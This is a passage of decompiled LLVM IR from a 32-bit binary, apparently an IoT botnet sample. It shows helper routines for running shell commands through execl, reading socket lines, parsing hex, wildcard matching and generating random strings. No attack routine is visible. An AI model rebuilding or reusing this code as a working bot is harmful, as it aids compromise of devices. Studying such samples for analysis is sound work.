  br i1 %v3_10001430, label %dec_label_pc_10001454, label %dec_label_pc_10001438

dec_label_pc_10001438:                            ; preds = %dec_label_pc_1000142c
  store i32 268440648, i32* @lr, align 4
  %v4_10001444 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  store i32 268440660, i32* @lr, align 4
  %v1_10001450 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001454

dec_label_pc_10001454:                            ; preds = %dec_label_pc_1000142c, %dec_label_pc_10001438
  %v3_10001454 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_10001460.19 to i32), i32* @lr, align 4
  %v1_1000145c = call i32 @__libc_close(i32 %v3_10001454)
  br label %dec_label_pc_10001498

dec_label_pc_10001464:                            ; preds = %dec_label_pc_10001418
  %v3_10001464 = load i32, i32* %stack_var_-48, align 4
  %v3_10001468 = icmp eq i32 %v3_10001464, 0
  br i1 %v3_10001468, label %dec_label_pc_1000148c, label %dec_label_pc_10001470

dec_label_pc_10001470:                            ; preds = %dec_label_pc_10001464
  store i32 268440704, i32* @lr, align 4
  %v4_1000147c = call i32 @dup2(i32 %v3_10001464, i32 0, i32 %tmp)
  %v3_10001480 = load i32, i32* %stack_var_-48, align 4
  store i32 268440716, i32* @lr, align 4
  %v1_10001488 = call i32 @__libc_close(i32 %v3_10001480)
  br label %dec_label_pc_1000148c

dec_label_pc_1000148c:                            ; preds = %dec_label_pc_10001464, %dec_label_pc_10001470
  store i32 268440728, i32* @lr, align 4
  %v1_10001494 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001498

dec_label_pc_10001498:                            ; preds = %dec_label_pc_10001454, %dec_label_pc_1000148c
  %v10_100014bc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_10011888.20 to i32), i32 ptrtoint ([3 x i8]* @global_var_10011890.21 to i32), i32 ptrtoint ([3 x i8]* @global_var_10011894.22 to i32), i32 %arg1, i32 0, i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  %v1_100014c4 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_100014c8

dec_label_pc_100014c8:                            ; preds = %dec_label_pc_100013e4, %dec_label_pc_10001498
  %v2_100014cc = load i8, i8* %arg2, align 1
  %v3_100014d4 = icmp eq i8 %v2_100014cc, 114
  %v3_100014dc = load i32, i32* %stack_var_-48, align 4
  br i1 %v3_100014d4, label %dec_label_pc_100014dc, label %dec_label_pc_100014f4

dec_label_pc_100014dc:                            ; preds = %dec_label_pc_100014c8
  store i32 ptrtoint (i32* @global_var_100014f0.24 to i32), i32* @lr, align 4
  %v1_100014ec = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001508

dec_label_pc_100014f4:                            ; preds = %dec_label_pc_100014c8
  store i32 268440840, i32* @lr, align 4
  %v1_10001504 = call i32 @__libc_close(i32 %v3_100014dc)
  br label %dec_label_pc_10001508

dec_label_pc_10001508:                            ; preds = %dec_label_pc_100014dc, %dec_label_pc_100014f4
  %stack_var_-36.0 = phi i32 [ %v3_100014dc, %dec_label_pc_100014dc ], [ %tmp3, %dec_label_pc_100014f4 ]
  %v1_1000150c = mul i32 %stack_var_-36.0, 4
  %v3_10001518 = load i32, i32* @global_var_10024a4c.16, align 4
  %v2_1000151c = add i32 %v3_10001518, %v1_1000150c
  %v2_10001524 = inttoptr i32 %v2_1000151c to i32*
  store i32 %v0_100013c0, i32* %v2_10001524, align 4
  br label %dec_label_pc_10001530

dec_label_pc_10001530:                            ; preds = %dec_label_pc_100013f4, %dec_label_pc_10001390, %dec_label_pc_10001358, %dec_label_pc_10001324, %dec_label_pc_10001300, %dec_label_pc_10001508
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_10001390 ], [ -1, %dec_label_pc_100013f4 ], [ %stack_var_-36.0, %dec_label_pc_10001508 ], [ -1, %dec_label_pc_10001358 ], [ -1, %dec_label_pc_10001324 ], [ -1, %dec_label_pc_10001300 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32 %v3_100014dc, { 1, 0 }
  uselistorder i32 %v1_10001368, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10001530, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10001508, { 1, 0 }
  uselistorder label %dec_label_pc_100014c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001498, { 1, 0 }
  uselistorder label %dec_label_pc_1000148c, { 1, 0 }
  uselistorder label %dec_label_pc_10001454, { 1, 0 }
  uselistorder label %dec_label_pc_100013c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001300, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-308 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v3_1000156c = load i32, i32* @global_var_10024a4c.16, align 4
  %v3_10001570 = icmp eq i32 %v3_1000156c, 0
  br i1 %v3_10001570, label %dec_label_pc_1000159c, label %dec_label_pc_10001578

dec_label_pc_10001578:                            ; preds = %entry
  %v1_1000157c = mul i32 %arg1, 4
  %v2_1000158c = add i32 %v3_1000156c, %v1_1000157c
  %v1_10001590 = inttoptr i32 %v2_1000158c to i32*
  %v2_10001590 = load i32, i32* %v1_10001590, align 4
  %v3_10001594 = icmp eq i32 %v2_10001590, 0
  br i1 %v3_10001594, label %dec_label_pc_1000159c, label %dec_label_pc_100015a8

dec_label_pc_1000159c:                            ; preds = %dec_label_pc_10001578, %entry
  br label %dec_label_pc_100016d0

dec_label_pc_100015a8:                            ; preds = %dec_label_pc_10001578
  store i32 268441008, i32* @lr, align 4
  %v1_100015ac = call i32 @__libc_close(i32 %arg1)
  %v2_100015b0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268441020, i32* @lr, align 4
  %v1_100015b8 = call i32 @sigemptyset(i32 %v2_100015b0)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441036, i32* @lr, align 4
  %v2_100015c8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 2)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441052, i32* @lr, align 4
  %v2_100015d8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 3)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441068, i32* @lr, align 4
  %v2_100015e8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 1)
  %v2_100015f0 = ptrtoint i32* %stack_var_-308 to i32
  store i32 268441092, i32* @lr, align 4
  %v3_10001600 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_100015b0, i32 %v2_100015f0)
  %v2_10001620 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_10001604

dec_label_pc_10001604:                            ; preds = %dec_label_pc_1000164c, %dec_label_pc_100015a8
  %v3_10001614 = load i32, i32* @global_var_10024a4c.16, align 4
  %v2_10001618 = add i32 %v3_10001614, %v1_1000157c
  %v1_1000161c = inttoptr i32 %v2_10001618 to i32*
  %v2_1000161c = load i32, i32* %v1_1000161c, align 4
  store i32 268441140, i32* @lr, align 4
  %v3_10001630 = call i32 @__libc_waitpid(i32 %v2_1000161c, i32 %v2_10001620, i32 0)
  %v4_10001644 = icmp eq i32 %v3_10001630, -1
  br i1 %v4_10001644, label %dec_label_pc_1000164c, label %dec_label_pc_10001660

dec_label_pc_1000164c:                            ; preds = %dec_label_pc_10001604
  %v0_1000164c = call i32 @__errno_location()
  %v1_10001654 = inttoptr i32 %v0_1000164c to i32*
  %v2_10001654 = load i32, i32* %v1_10001654, align 4
  %v3_10001658 = icmp eq i32 %v2_10001654, 4
  br i1 %v3_10001658, label %dec_label_pc_10001604, label %dec_label_pc_10001660

dec_label_pc_10001660:                            ; preds = %dec_label_pc_10001604, %dec_label_pc_1000164c
  %v4_10001644.lcssa = phi i1 [ false, %dec_label_pc_10001604 ], [ true, %dec_label_pc_1000164c ]
  store i32 268441204, i32* @lr, align 4
  %v3_10001670 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_100015f0, i32 0)
  %v1_10001678 = mul i32 %tmp5, 4
  %v3_10001684 = load i32, i32* @global_var_10024a4c.16, align 4
  %v2_10001688 = add i32 %v3_10001684, %v1_10001678
  %v2_10001690 = inttoptr i32 %v2_10001688 to i32*
  store i32 0, i32* %v2_10001690, align 4
  br i1 %v4_10001644.lcssa, label %dec_label_pc_100016c8, label %dec_label_pc_100016a4

dec_label_pc_100016a4:                            ; preds = %dec_label_pc_10001660
  %v3_100016a4 = load i32, i32* %stack_var_-52, align 4
  %v1_100016b0 = call i32 @__asm_rlwinm(i32 %v3_100016a4, i32 0, i32 16, i32 23)
  %v4_100016b4 = sdiv i32 %v1_100016b0, 256
  br label %dec_label_pc_100016c8

dec_label_pc_100016c8:                            ; preds = %dec_label_pc_10001660, %dec_label_pc_100016a4
  %storemerge2 = phi i32 [ %v4_100016b4, %dec_label_pc_100016a4 ], [ -1, %dec_label_pc_10001660 ]
  br label %dec_label_pc_100016d0

dec_label_pc_100016d0:                            ; preds = %dec_label_pc_1000159c, %dec_label_pc_100016c8
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_100016c8 ], [ -1, %dec_label_pc_1000159c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_100015b0, { 0, 2, 1, 4, 3, 6, 5, 7 }
  uselistorder i32 %v1_1000157c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100016d0, { 1, 0 }
  uselistorder label %dec_label_pc_100016c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001660, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_10001764

dec_label_pc_10001724:                            ; preds = %dec_label_pc_10001774
  store i32 268441412, i32* @lr, align 4
  %v1_10001740 = call i32 @__libc_read(i32 %arg3)
  %v1_10001750 = add nuw i32 %storemerge25, 1
  %v3_1000175c = icmp eq i32 %v1_10001740, 1
  br i1 %v3_1000175c, label %dec_label_pc_10001764, label %dec_label_pc_10001798

dec_label_pc_10001764:                            ; preds = %entry, %dec_label_pc_10001724
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_10001750, %dec_label_pc_10001724 ]
  %v2_1000176c = icmp slt i32 %storemerge25, %arg2
  br i1 %v2_1000176c, label %dec_label_pc_10001774, label %dec_label_pc_10001798

dec_label_pc_10001774:                            ; preds = %dec_label_pc_10001764
  %v2_10001780 = add i32 %storemerge25, %arg1
  %v1_10001784 = add i32 %v2_10001780, -1
  %v1_10001788 = inttoptr i32 %v1_10001784 to i8*
  %v2_10001788 = load i8, i8* %v1_10001788, align 1
  %v3_10001790 = icmp eq i8 %v2_10001788, 10
  br i1 %v3_10001790, label %dec_label_pc_10001798, label %dec_label_pc_10001724

dec_label_pc_10001798:                            ; preds = %dec_label_pc_10001774, %dec_label_pc_10001764, %dec_label_pc_10001724
  %stack_var_-36.0.lcssa = phi i32 [ 1, %dec_label_pc_10001774 ], [ 1, %dec_label_pc_10001764 ], [ %v1_10001740, %dec_label_pc_10001724 ]
  %v3_1000179c = icmp eq i32 %stack_var_-36.0.lcssa, 0
  %storemerge = select i1 %v3_1000179c, i32 0, i32 %arg1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10001740, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001764, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_100018343 = load i8, i8* %arg1, align 1
  %v3_1000183c6 = icmp eq i8 %v2_100018343, 0
  br i1 %v3_1000183c6, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_100017f4:                            ; preds = %dec_label_pc_10001844
  %v1_100017f8 = mul i32 %stack_var_-40.07, 16
  %v2_10001800 = load i8, i8* %stack_var_-24.08, align 1
  %v3_10001800 = zext i8 %v2_10001800 to i32
  %v1_10001810 = mul nuw nsw i32 %v3_10001800, 4
  %v2_10001814 = add i32 %v1_10001810, ptrtoint (i32* @global_var_10011898.25 to i32)
  %v1_10001818 = inttoptr i32 %v2_10001814 to i32*
  %v2_10001818 = load i32, i32* %v1_10001818, align 4
  %v2_1000181c = or i32 %v2_10001818, %v1_100017f8
  %v1_10001828 = add i32 %v4_100018309, 1
  %v5_1000182c = inttoptr i32 %v1_10001828 to i8*
  %v2_10001834 = load i8, i8* %v5_1000182c, align 1
  %v3_1000183c = icmp eq i8 %v2_10001834, 0
  br i1 %v3_1000183c, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_10001844:                            ; preds = %entry, %dec_label_pc_100017f4
  %v4_100018309 = phi i32 [ %v1_10001828, %dec_label_pc_100017f4 ], [ %tmp, %entry ]
  %stack_var_-24.08 = phi i8* [ %v5_1000182c, %dec_label_pc_100017f4 ], [ %arg1, %entry ]
  %stack_var_-40.07 = phi i32 [ %v2_1000181c, %dec_label_pc_100017f4 ], [ 0, %entry ]
  %tmp17 = icmp sgt i32 %stack_var_-40.07, -1
  br i1 %tmp17, label %dec_label_pc_100017f4, label %dec_label_pc_10001850

dec_label_pc_10001850:                            ; preds = %dec_label_pc_100017f4, %dec_label_pc_10001844, %entry
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v2_1000181c, %dec_label_pc_100017f4 ], [ %stack_var_-40.07, %dec_label_pc_10001844 ]
  ret i32 %stack_var_-40.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-40.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001850, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001844, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %v2_1000188c = load i8, i8* %arg1, align 1
  %v3_1000189c = icmp eq i8 %v2_1000188c, 42
  br i1 %v3_1000189c, label %dec_label_pc_100018d4, label %dec_label_pc_100018a4

dec_label_pc_100018a4:                            ; preds = %entry
  %v3_100018a8 = icmp eq i8 %v2_1000188c, 63
  br i1 %v3_100018a8, label %dec_label_pc_10001948, label %dec_label_pc_100018b0

dec_label_pc_100018b0:                            ; preds = %dec_label_pc_100018a4
  %v3_100018b4 = icmp eq i8 %v2_1000188c, 0
  br i1 %v3_100018b4, label %dec_label_pc_100018c0, label %dec_label_pc_100019a4

dec_label_pc_100018c0:                            ; preds = %dec_label_pc_100018b0
  %v2_100018c4 = load i8, i8* %tmp, align 1
  %v3_100018c4 = zext i8 %v2_100018c4 to i32
  br label %dec_label_pc_10001a28

dec_label_pc_100018d4:                            ; preds = %entry
  %v2_100018d8 = add i32 %tmp9, 1
  store i32 268441832, i32* @lr, align 4
  %v5_100018e4 = inttoptr i32 %v2_100018d8 to i8*
  %v6_100018e4 = call i32 @wildString(i8* %v5_100018e4, i32 %arg2, i32 %tmp9)
  %v3_100018ec = icmp eq i32 %v6_100018e4, 0
  br i1 %v3_100018ec, label %dec_label_pc_10001934, label %dec_label_pc_100018f4

dec_label_pc_100018f4:                            ; preds = %dec_label_pc_100018d4
  %v2_100018f8 = load i8, i8* %tmp, align 1
  %v3_10001900 = icmp eq i8 %v2_100018f8, 0
  br i1 %v3_10001900, label %dec_label_pc_1000193c, label %dec_label_pc_10001908

dec_label_pc_10001908:                            ; preds = %dec_label_pc_100018f4
  %v2_1000190c = add i32 %arg2, 1
  store i32 268441884, i32* @lr, align 4
  %v6_10001918 = call i32 @wildString(i8* nonnull %arg1, i32 %v2_1000190c, i32 %arg2)
  %v3_10001920 = icmp eq i32 %v6_10001918, 0
  br i1 %v3_10001920, label %dec_label_pc_10001934, label %dec_label_pc_1000193c

dec_label_pc_10001934:                            ; preds = %dec_label_pc_10001908, %dec_label_pc_100018d4
  br label %dec_label_pc_1000193c

dec_label_pc_1000193c:                            ; preds = %dec_label_pc_100018f4, %dec_label_pc_10001908, %dec_label_pc_10001934
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10001934 ], [ 1, %dec_label_pc_10001908 ], [ 1, %dec_label_pc_100018f4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001948:                            ; preds = %dec_label_pc_100018a4
  %v2_1000194c = load i8, i8* %tmp, align 1
  %v3_10001954 = icmp eq i8 %v2_1000194c, 0
  br i1 %v3_10001954, label %dec_label_pc_10001998, label %dec_label_pc_1000195c

dec_label_pc_1000195c:                            ; preds = %dec_label_pc_10001948
  %v1_10001960 = add i32 %tmp9, 1
  %v2_10001968 = add i32 %arg2, 1
  store i32 268441976, i32* @lr, align 4
  %v4_10001974 = inttoptr i32 %v1_10001960 to i8*
  %v5_10001974 = call i32 @wildString(i8* %v4_10001974, i32 %v2_10001968, i32 %arg2)
  %v3_1000197c = icmp ne i32 %v5_10001974, 0
  %. = zext i1 %v3_1000197c to i32
  br label %dec_label_pc_10001998

dec_label_pc_10001998:                            ; preds = %dec_label_pc_1000195c, %dec_label_pc_10001948
  %storemerge3 = phi i32 [ 1, %dec_label_pc_10001948 ], [ %., %dec_label_pc_1000195c ]
  br label %dec_label_pc_10001a28

dec_label_pc_100019a4:                            ; preds = %dec_label_pc_100018b0
  %v3_100019a8 = load i8, i8* %arg1, align 1
  %v4_100019a8 = zext i8 %v3_100019a8 to i32
  store i32 268442044, i32* @lr, align 4
  %v3_100019b8 = call i32 @__GI_toupper(i32 %v4_100019a8, i32 %tmp9)
  %v3_100019c4 = load i8, i8* %tmp, align 1
  %v4_100019c4 = zext i8 %v3_100019c4 to i32
  store i32 268442072, i32* @lr, align 4
  %v3_100019d4 = call i32 @__GI_toupper(i32 %v4_100019c4, i32 %arg2)
  %v4_100019dc = icmp eq i32 %v3_100019b8, %v3_100019d4
  br i1 %v4_100019dc, label %dec_label_pc_100019e4, label %dec_label_pc_10001a20

dec_label_pc_100019e4:                            ; preds = %dec_label_pc_100019a4
  %v1_100019e8 = add i32 %tmp9, 1
  %v2_100019f0 = add i32 %arg2, 1
  store i32 268442112, i32* @lr, align 4
  %v4_100019fc = inttoptr i32 %v1_100019e8 to i8*
  %v5_100019fc = call i32 @wildString(i8* %v4_100019fc, i32 %v2_100019f0, i32 %arg2)
  %v3_10001a04 = icmp ne i32 %v5_100019fc, 0
  %.8 = zext i1 %v3_10001a04 to i32
  br label %dec_label_pc_10001a20

dec_label_pc_10001a20:                            ; preds = %dec_label_pc_100019e4, %dec_label_pc_100019a4
  %storemerge = phi i32 [ 1, %dec_label_pc_100019a4 ], [ %.8, %dec_label_pc_100019e4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001a28:                            ; preds = %dec_label_pc_10001998, %dec_label_pc_1000193c, %dec_label_pc_100018c0, %dec_label_pc_10001a20
  %stack_var_-36.0 = phi i32 [ %storemerge4, %dec_label_pc_1000193c ], [ %storemerge3, %dec_label_pc_10001998 ], [ %v3_100018c4, %dec_label_pc_100018c0 ], [ %storemerge, %dec_label_pc_10001a20 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_10001a28, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000193c, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268442228, i32* @lr, align 4
  %v1_10001a70 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_10001a70, i32* %arg2, align 4
  %v4_10001a8c = icmp eq i32 %v1_10001a70, -1
  %. = zext i1 %v4_10001a8c to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10001b1c2 = load i8, i8* %arg1, align 1
  %v3_10001b245 = icmp eq i8 %v2_10001b1c2, 0
  br i1 %v3_10001b245, label %dec_label_pc_10001b2c, label %dec_label_pc_10001ae4

dec_label_pc_10001ae4:                            ; preds = %entry, %dec_label_pc_10001ae4
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_10001ae4 ], [ %arg1, %entry ]
  %storemerge.in6 = phi i32 [ %v1_10001b10, %dec_label_pc_10001ae4 ], [ %tmp, %entry ]
  %v3_10001ae8 = load i8, i8* %storemerge7, align 1
  %v4_10001ae8 = zext i8 %v3_10001ae8 to i32
  store i32 %v4_10001ae8, i32* %r3.global-to-local, align 4
  store i32 268442364, i32* @lr, align 4
  %v3_10001af8 = call i32 @__GI_toupper(i32 %v4_10001ae8, i32 %storemerge.in6)
  store i32 %v3_10001af8, i32* %r3.global-to-local, align 4
  %v1_10001b08 = trunc i32 %v3_10001af8 to i8
  store i8 %v1_10001b08, i8* %storemerge7, align 1
  %v1_10001b10 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_10001b10 to i8*
  %v2_10001b1c = load i8, i8* %storemerge, align 1
  %v3_10001b24 = icmp eq i8 %v2_10001b1c, 0
  br i1 %v3_10001b24, label %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, label %dec_label_pc_10001ae4

dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge: ; preds = %dec_label_pc_10001ae4
  %v0_10001b40.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001b2c

dec_label_pc_10001b2c:                            ; preds = %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, %entry
  %v0_10001b40 = phi i32 [ %v0_10001b40.pre, %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge ], [ %tmp, %entry ]
  ret i32 %v0_10001b40

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_10001b10, { 1, 0 }
  uselistorder i32 %storemerge.in6, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10001ae4, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001b5c = load i32, i32* %r3.global-to-local, align 4
  %v2_10001bdc4 = icmp sgt i32 %arg2, 0
  br i1 %v2_10001bdc4, label %dec_label_pc_10001b78, label %dec_label_pc_10001be4

dec_label_pc_10001b78:                            ; preds = %entry, %dec_label_pc_10001b78
  %storemerge37 = phi i32 [ %v1_10001bcc, %dec_label_pc_10001b78 ], [ 0, %entry ]
  %v2_10001b84 = add i32 %storemerge37, %v0_10001b5c
  %v0_10001b88 = call i32 @rand_cmwc()
  store i32 %v0_10001b88, i32* %r3.global-to-local, align 4
  %v1_10001b9c = urem i32 %v0_10001b88, 26
  %fold = add nuw nsw i32 %v1_10001b9c, 65
  %v1_10001bc4 = trunc i32 %fold to i8
  %v3_10001bc4 = inttoptr i32 %v2_10001b84 to i8*
  store i8 %v1_10001bc4, i8* %v3_10001bc4, align 1
  %v1_10001bcc = add nuw nsw i32 %storemerge37, 1
  %v2_10001bdc = icmp slt i32 %v1_10001bcc, %arg2
  br i1 %v2_10001bdc, label %dec_label_pc_10001b78, label %dec_label_pc_10001bd4.dec_label_pc_10001be4_crit_edge

dec_label_pc_10001bd4.dec_label_pc_10001be4_crit_edge: ; preds = %dec_label_pc_10001b78
  %v0_10001bfc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001be4

dec_label_pc_10001be4:                            ; preds = %dec_label_pc_10001bd4.dec_label_pc_10001be4_crit_edge, %entry
  %v0_10001bfc = phi i32 [ %v0_10001bfc.pre, %dec_label_pc_10001bd4.dec_label_pc_10001be4_crit_edge ], [ %v0_10001b5c, %entry ]
  ret i32 %v0_10001bfc

; uselistorder directives
  uselistorder i32 %v1_10001bcc, { 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v0_10001b5c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10001b78, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i8, align 1
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10001c38.26 to i32), i32* @lr, align 4
  %v4_10001c34 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-40, align 4
  %v2_10001c48 = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_10001c5c

dec_label_pc_10001c5c:                            ; preds = %entry, %dec_label_pc_10001c5c
  %storemerge618 = phi i32 [ 0, %entry ], [ %v1_10001c78, %dec_label_pc_10001c5c ]
  %v1_10001c64 = mul nuw nsw i32 %storemerge618, 4
  %v2_10001c68 = add i32 %v1_10001c64, %v2_10001c48
  %v2_10001c70 = inttoptr i32 %v2_10001c68 to i32*
  store i32 0, i32* %v2_10001c70, align 4
  %v1_10001c78 = add nuw nsw i32 %storemerge618, 1
  %tmp42 = icmp ult i32 %v1_10001c78, 32
  br i1 %tmp42, label %dec_label_pc_10001c5c, label %dec_label_pc_10001c8c

dec_label_pc_10001c8c:                            ; preds = %dec_label_pc_10001c5c
  %v1_10001c90 = udiv i32 %arg1, 32
  %v1_10001c98 = mul nuw nsw i32 %v1_10001c90, 4
  %v2_10001c9c = ptrtoint i32* %stack_var_-200 to i32
  %v2_10001ca0 = add nuw nsw i32 %v1_10001c98, 32
  %v1_10001ca4 = add i32 %v2_10001ca0, %v2_10001c9c
  %v1_10001ca8 = inttoptr i32 %v1_10001ca4 to i32*
  %v2_10001ca8 = load i32, i32* %v1_10001ca8, align 4
  %v1_10001cb0 = urem i32 %arg1, 32
  %v3_10001cb8 = shl i32 1, %v1_10001cb0
  %v2_10001cbc = or i32 %v2_10001ca8, %v3_10001cb8
  store i32 %v2_10001cbc, i32* %v1_10001ca8, align 4
  %v1_10001cd8 = add i32 %arg1, 1
  %v2_10001ce4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268442880, i32* @lr, align 4
  %v5_10001cfc = call i32 @__libc_select(i32 %v1_10001cd8, i32 %v2_10001c48, i32 0, i32 %v2_10001c48, i32 %v2_10001ce4)
  %v2_10001d0c = icmp sgt i32 %v5_10001cfc, 0
  br i1 %v2_10001d0c, label %dec_label_pc_10001eb8.preheader, label %dec_label_pc_10001e1c.preheader

dec_label_pc_10001e1c.preheader:                  ; preds = %dec_label_pc_10001c8c
  %tmp43 = icmp slt i32 %tmp25, 10
  br i1 %tmp43, label %dec_label_pc_10001d18, label %dec_label_pc_10001eb8.preheader

dec_label_pc_10001d18:                            ; preds = %dec_label_pc_10001e1c.preheader, %dec_label_pc_10001e10
  %stack_var_-176.017 = phi i32 [ %v1_10001e14, %dec_label_pc_10001e10 ], [ %tmp25, %dec_label_pc_10001e1c.preheader ]
  %v3_10001d1c = load i32, i32* @global_var_10024a28.27, align 4
  store i32 ptrtoint (i32* @global_var_10001d34.29 to i32), i32* @lr, align 4
  %v5_10001d30 = call i32 @Rootsprintf(i32 %v3_10001d1c, i32 ptrtoint ([5 x i8]* @global_var_10011c98.28 to i32), i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32))
  store i32 30, i32* %stack_var_-40, align 4
  store i32 %v2_10001c48, i32* %stack_var_-200, align 4
  store i32 0, i32* %stack_var_-168, align 4
  br label %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge

dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge: ; preds = %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge.dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge_crit_edge, %dec_label_pc_10001d18
  %v3_10001d5c.pre = phi i32 [ %v2_10001c48, %dec_label_pc_10001d18 ], [ %v3_10001d5c.pre.pre, %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge.dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge_crit_edge ]
  %v1_10001d7449 = phi i32 [ 1, %dec_label_pc_10001d18 ], [ %v1_10001d74, %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge.dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge_crit_edge ]
  %v1_10001d60 = mul nuw nsw i32 %v1_10001d7449, 4
  %v2_10001d64 = add i32 %v1_10001d60, %v3_10001d5c.pre
  %v2_10001d6c = inttoptr i32 %v2_10001d64 to i32*
  store i32 0, i32* %v2_10001d6c, align 4
  %v1_10001d74 = add nuw nsw i32 %v1_10001d7449, 1
  %tmp44 = icmp ult i32 %v1_10001d74, 32
